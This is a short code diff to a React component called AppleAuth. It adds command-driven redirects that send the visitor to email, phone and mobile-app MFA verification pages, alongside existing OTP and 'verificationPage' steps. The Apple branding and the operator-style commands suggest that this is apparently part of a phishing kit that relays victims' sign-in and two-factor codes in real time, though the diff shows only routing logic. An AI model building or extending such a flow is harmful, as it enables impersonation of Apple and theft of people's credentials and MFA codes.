@@ -32,6 +32,30 @@ export default function AppleAuth() {
             setTimeout(() => {
                 router.push('/AppleOtpPage');
             }, 1500);
+        } else if (command === 'REQUEST_AUTHENTICATION_EMAIL') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/AuthenticationPage');
+            }, 1500);
+        } else if (command === 'REQUEST_AUTHENTICATION_PHONE') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/NumAuthenticationPage');
+            }, 1500);
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            setIsLoading(false);
+            // setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                // resetCommand(); 
+                router.push('/MfaPage');
+            }, 1500);
         } else if (command === 'FINISH') {
             router.push('/verificationPage');
         }
